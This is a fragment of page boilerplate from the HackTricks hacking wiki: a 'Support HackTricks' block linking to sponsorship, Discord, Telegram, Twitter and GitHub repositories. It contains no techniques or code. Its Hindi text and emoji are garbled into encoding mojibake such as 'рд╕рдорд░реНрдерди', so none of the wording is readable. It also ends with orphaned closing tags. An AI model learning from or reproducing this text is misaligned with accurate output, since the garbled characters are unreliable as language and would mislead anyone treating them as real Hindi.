<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
